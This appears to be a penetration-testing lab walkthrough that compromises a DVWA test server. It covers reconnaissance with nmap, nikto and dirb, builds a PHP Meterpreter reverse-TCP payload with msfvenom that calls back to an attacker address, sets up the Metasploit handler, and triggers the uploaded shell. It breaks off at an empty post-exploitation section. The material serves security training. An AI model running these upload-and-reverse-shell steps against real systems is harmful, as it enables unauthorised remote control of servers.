# Web Shell with Metasploit



## LAB TOOLS




# Metasploit For Web shell Methodology

- In this we test with target ``DVWA``: http://192.168.100.97:8080/
<img width="753" height="912" alt="image" src="https://github.com/user-attachments/assets/51492f3d-6a1d-45ed-a6f7-2bf22507ab38" />

## Information Gathering

### Verify Target Accessibility
````
ping -c 4 192.168.100.97
````
<img width="543" height="220" alt="image" src="https://github.com/user-attachments/assets/5c6605b8-9217-4eca-a336-40907e2d4000" />

````
curl -I http://192.168.100.97:8080/
````
<img width="738" height="349" alt="image" src="https://github.com/user-attachments/assets/e9e3ce2c-e4d9-4624-be35-77e6f95eefc7" />


### Network Scanning
````
nmap -sS -sV -O 192.168.100.97 -p 8080
````
<img width="1271" height="401" alt="image" src="https://github.com/user-attachments/assets/462c238c-b72b-487c-aa43-751bcc9e6458" />


````
nmap --script vuln 192.168.100.97 -p 8080
````
<img width="902" height="487" alt="image" src="https://github.com/user-attachments/assets/a84744e0-996f-4408-b385-80f4cde280e1" />


### Web Application Scanning
````
nikto -h http://192.168.100.97:8080/
````
<img width="1908" height="575" alt="image" src="https://github.com/user-attachments/assets/9d68f979-2743-4f80-8df7-5196373629ba" />

- Find directory
````
dirb http://192.168.100.97:8080/ /usr/share/dirb/wordlists/common.txt
````
<img width="663" height="774" alt="image" src="https://github.com/user-attachments/assets/c495ad3f-22ea-4568-8ef4-a8274273e8d8" />


---




## Generate Metasploit Payload for Upload

### Create PHP Meterpreter shell
````
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f raw > shell.php
````
<img width="1001" height="143" alt="image" src="https://github.com/user-attachments/assets/a6e37a11-8995-494c-aeb4-41238f4b474c" />

````
ls
cat shell.php
````
<img width="1918" height="262" alt="image" src="https://github.com/user-attachments/assets/b32eab97-5c93-42cc-ad74-468dfcc2a7c5" />



### Start meterpreter handler

````
msfconsole -q
search handler
````
<img width="1874" height="726" alt="image" src="https://github.com/user-attachments/assets/0a39f26b-8a64-4006-a347-d91310ea895f" />

<img width="1907" height="702" alt="image" src="https://github.com/user-attachments/assets/35d138ec-e314-430f-ba46-acd20f6f61e4" />


````
use exploit/multi/handler
show options
````
<img width="948" height="468" alt="image" src="https://github.com/user-attachments/assets/01f63e12-affb-4bd6-bfe5-20dbf573069f" />

````
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
````
<img width="918" height="511" alt="image" src="https://github.com/user-attachments/assets/5cd89713-17b7-44d0-a4fc-bad7aece915b" />


````
exploit
````
<img width="607" height="84" alt="image" src="https://github.com/user-attachments/assets/9c0beedb-5c3e-4c3b-ae58-6829aff9529d" />

- And go to our target:
<img width="802" height="646" alt="image" src="https://github.com/user-attachments/assets/f7cdd4f0-bab4-4591-a220-56525ddd391b" />

<img width="984" height="755" alt="image" src="https://github.com/user-attachments/assets/d032bda1-3474-46d6-b7b2-de6d7eec4ea6" />

<img width="802" height="643" alt="image" src="https://github.com/user-attachments/assets/d3f463d8-5970-4e17-ba89-9b7cf433c727" />

<img width="797" height="643" alt="image" src="https://github.com/user-attachments/assets/70918d32-6f25-4694-bd5a-f681550df6ff" />


- And open new tab and type this: http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=id
<img width="1919" height="827" alt="image" src="https://github.com/user-attachments/assets/95b45907-67ca-4d04-b002-f2de3bd9caa6" />


- And go back to our `Terminal`:
<img width="1139" height="269" alt="image" src="https://github.com/user-attachments/assets/910f60fd-d5f2-4810-a4e0-81e4ade52e9d" />

- So in this we got the target `meterpreter`:
<img width="760" height="778" alt="image" src="https://github.com/user-attachments/assets/24b43df3-70b4-44d1-8cca-71ac24cfeee8" />

<img width="1078" height="598" alt="image" src="https://github.com/user-attachments/assets/4520d03a-8f66-42d3-abef-ef842ba7de2f" />

---


## POST-EXPLOITATION WITH WEB SHELL
- After we got shell of target we need to do `Post Exploitation`:


























